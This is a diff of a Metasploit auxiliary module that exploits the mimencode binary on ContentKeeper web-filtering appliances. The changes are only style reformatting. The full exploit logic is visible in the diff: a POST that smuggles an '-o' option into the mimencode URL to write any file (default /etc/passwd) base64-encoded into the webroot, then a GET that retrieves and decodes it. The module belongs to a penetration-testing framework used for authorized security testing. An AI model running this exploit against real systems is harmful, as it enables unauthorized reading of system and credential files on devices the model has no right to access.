@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,22 +7,21 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Scanner
 
   def initialize
     super(
       'Name'        => 'ContentKeeper Web Appliance mimencode File Access',
-      'Description' => %q{
+      'Description' => %q(
         This module abuses the 'mimencode' binary present within
         ContentKeeper Web filtering appliances to retrieve arbitrary
         files outside of the webroot.
-        },
-      'References'   =>
+        ),
+      'References' =>
         [
           [ 'OSVDB', '54551' ],
-          [ 'URL', 'http://www.aushack.com/200904-contentkeeper.txt' ],
+          [ 'URL', 'http://www.aushack.com/200904-contentkeeper.txt' ]
         ],
       'Author'      => [ 'patrick' ],
       'License'     => MSF_LICENSE)
@@ -29,11 +29,12 @@ class MetasploitModule < Msf::Auxiliary
     register_options(
       [
         OptString.new('FILE', [ true, 'The file to traverse for', '/etc/passwd']),
-        OptString.new('URL', [ true, 'The path to mimencode', '/cgi-bin/ck/mimencode']),
-      ], self.class)
+        OptString.new('URL', [ true, 'The path to mimencode', '/cgi-bin/ck/mimencode'])
+      ], self.class
+    )
   end
 
-  def run_host(ip)
+  def run_host(_ip)
     begin
       tmpfile = Rex::Text.rand_text_alphanumeric(20) # Store the base64 encoded traveral data in a hard-to-brute filename, just in case.
 
@@ -41,25 +42,27 @@ class MetasploitModule < Msf::Auxiliary
       res = send_request_raw(
         {
           'method'  => 'POST',
-          'uri'     => normalize_uri(datastore['URL']) + '?-o+' + '/home/httpd/html/' + tmpfile + '+' + datastore['FILE'],
-        }, 25)
+          'uri'     => normalize_uri(datastore['URL']) + '?-o+' + '/home/httpd/html/' + tmpfile + '+' + datastore['FILE']
+        }, 25
+      )
 
-      if (res and res.code == 500)
+      if res && (res.code == 500)
 
         print_status("Request appears successful on #{rhost}:#{rport}! Response: #{res.code}")
 
         file = send_request_raw(
           {
             'method'  => 'GET',
-            'uri'     => '/' + tmpfile,
-          }, 25)
+            'uri'     => '/' + tmpfile
+          }, 25
+        )
 
-        if (file and file.code == 200)
+        if file && (file.code == 200)
           print_status("Request for #{datastore['FILE']} appears to have worked on #{rhost}:#{rport}! Response: #{file.code}\r\n#{Rex::Text.decode_base64(file.body)}")
-        elsif (file and file.code)
+        elsif file && file.code
           print_error("Attempt returned HTTP error #{res.code} on #{rhost}:#{rport} Response: \r\n#{res.body}")
         end
-      elsif (res and res.code)
+      elsif res && res.code
         print_error("Attempt returned HTTP error #{res.code} on #{rhost}:#{rport} Response: \r\n#{res.body}")
       end
 
